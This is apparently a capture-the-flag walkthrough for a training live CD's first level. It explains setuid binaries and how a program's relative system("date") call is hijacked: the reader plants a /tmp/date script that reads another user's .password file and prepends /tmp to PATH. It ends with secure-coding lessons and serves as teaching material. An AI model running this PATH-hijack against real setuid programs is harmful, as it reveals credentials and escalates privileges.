## Level 1: avoid the "system" call in C

When the live CD starts,
you are automatically logged in as user `level00`.
The "message of the day" says:

> In /home/level01/.password is the password of the level01 user.
> Your mission, should you choose to accept it, is to read that
> file and login as level01 to advance to the next level.
> You may find the files in /levels/level01 useful.

All levels on this CD work roughly the same way:

- The password of each `levelXX` user is stored in a file named `.password` in their home directory.

- The user home directories are well protected:
  only their owners have access (`0700` mode)

- The vulnerable program and its source code are stored in the `/levels/levelXX` directories.

- The explanation of the level is shown when you login,
  and the same message is also in the `motd.txt` file of the user.

- The explanation of the level always contains some hint as to how you can beat the challange, so it's good to read carefully.

OK, let's get started!

Taking the hint from the message after login,
let's look at the files in the `/levels/level01` directory:

    level00@box:~$ ls -l /levels/level01
    total 32
    -rw-rw-r--  1 level01  level01    69 Mar  9 19:08 Makefile
    -rwsr-xr-x  1 level01  level01  7352 Mar  9 19:08 level01
    -rw-rw-r--  1 level01  level01   152 Mar  9 19:08 level01.c

Anything unusual here?
The user permission of the file `level01` looks pretty unusual: `rws`.
What's that?

Normally the 3rd letter in the permission bits is either `x` or `-`,
indicating whether the file is executable or not.
Here we have `s`,
which indicates the *setuid* bit is set.
Normal programs are executed as the current user.
In contrast,
programs with the setuid bit set are executed as the owner of the file.
So,
even though we are logged in as user `level00` now,
when we execute this program it will run as `level01`,
and enjoy the same access privileges as that user,
instead of `level00`.
Maybe this can be useful for something.

Let's run it and see what it does:
```
level00@box:~$ /levels/level01/level01
Current time: Tue Sep  3 23:55:54 UTC 2013
```

Ok that's not very interesting.
It looks like it just prints the date, that's it.

The relevant part of the source code seems to be this:
```
printf("Current time: ");
fflush(stdout);
system("date");
return 0;
```

Notice that instead of using a native C function to get the date,
the program uses the `system` function to run the `date` command.
We can look up what `system` does exactly with `man system`:
it executes the specified command by calling `/bin/sh -c`.

Consider how the shell executes a command that is not an absolute path:
it takes the list of directories defined in the `$PATH` variable,
and checks if an executable file with the same name exists or not,
and runs the first match it finds.

Therein lies our exploit:

1. Create a script named "date",
   and make it print the content of `/home/level01/.password`:

        level00@box:~$ cat >/tmp/date
        #!/bin/cat /home/level01/.password
        ^D  # press Control-D to stop editing

2. Make it executable

        $ chmod +x /tmp/date

3. Prepend the directory of the script to `PATH`,
   so that our script is found before the real `date` program.

        $ PATH=/tmp:$PATH

Now if we run the `level01` command again:
```
$ /levels/level01/level01
Current time: aepeefoo
#!/bin/cat /home/level01/.password
```

Bingo! Now we can login as user `level01` using the revealed password.

### Lessons to learn

- Read well the documentation and understand the libraries and methods you use:
  `man system` well explains that it should not be used in setuid programs.

- If you must use `system()`,
  do not use relative paths,
  as the program can be easily subverted by manipulating the `$PATH` variable.
